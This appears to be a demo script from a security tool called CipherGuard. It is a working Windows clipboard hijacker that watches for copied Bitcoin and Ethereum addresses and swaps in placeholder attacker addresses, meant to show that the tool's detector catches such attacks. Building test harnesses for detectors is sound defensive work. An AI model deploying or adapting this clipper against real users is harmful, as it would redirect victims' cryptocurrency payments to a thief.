"""
CipherGuard — Demo Clipboard Hijacker
A simple clipboard hijacker for DEMONSTRATION PURPOSES ONLY.
Run this alongside CipherGuard to prove that ClipGuard detects hijack attacks.

Usage:
    Terminal 1: python demo/demo_clipjacker.py
    Terminal 2: python main.py (enable ClipGuard)
    Copy a Bitcoin address → watch ClipGuard catch the hijack

WARNING: Only use on your own machine for educational demonstration.
"""

import re
import time
import sys
import win32clipboard

# Attacker's fake Bitcoin address
ATTACKER_BTC_ADDRESS = "1HACKER999xyzABCDEFGHJKLMNPQRSTUVWX"

# Bitcoin address pattern (Legacy)
BTC_PATTERN = re.compile(r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$")

# Ethereum address pattern
ETH_PATTERN = re.compile(r"^0x[0-9a-fA-F]{40}$")

# Attacker's fake Ethereum address
ATTACKER_ETH_ADDRESS = "0xDEADBEEF1234567890abcdef1234567890ABCDEF"


def get_clipboard():
    """Read clipboard content."""
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return data
        win32clipboard.CloseClipboard()
    except Exception:
        pass
    return ""


def set_clipboard(text):
    """Write to clipboard."""
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return True
    except Exception:
        return False


def main():
    print("=" * 60)
    print("  DEMO CLIPBOARD HIJACKER — CipherGuard Demonstration")
    print("=" * 60)
    print(f"  Attacker BTC: {ATTACKER_BTC_ADDRESS}")
    print(f"  Attacker ETH: {ATTACKER_ETH_ADDRESS}")
    print()
    print("  Copy a Bitcoin or Ethereum address to see the hijack.")
    print("  Press Ctrl+C in this terminal to stop.")
    print("=" * 60)
    print()

    hijack_count = 0

    try:
        while True:
            clipboard = get_clipboard()
            if clipboard:
                stripped = clipboard.strip()

                # Check for Bitcoin address
                if BTC_PATTERN.match(stripped) and stripped != ATTACKER_BTC_ADDRESS:
                    print(f"[HIJACK] Bitcoin detected: {stripped[:30]}...")
                    print(f"[HIJACK] Replacing with: {ATTACKER_BTC_ADDRESS}")
                    if set_clipboard(ATTACKER_BTC_ADDRESS):
                        hijack_count += 1
                        print(f"[HIJACK] Success! Total hijacks: {hijack_count}")
                    print()

                # Check for Ethereum address
                elif ETH_PATTERN.match(stripped) and stripped != ATTACKER_ETH_ADDRESS:
                    print(f"[HIJACK] Ethereum detected: {stripped[:30]}...")
                    print(f"[HIJACK] Replacing with: {ATTACKER_ETH_ADDRESS}")
                    if set_clipboard(ATTACKER_ETH_ADDRESS):
                        hijack_count += 1
                        print(f"[HIJACK] Success! Total hijacks: {hijack_count}")
                    print()

            time.sleep(1)  # Check every second

    except KeyboardInterrupt:
        print(f"\n[Clipboard hijacker stopped. Total hijacks: {hijack_count}]")


if __name__ == "__main__":
    main()
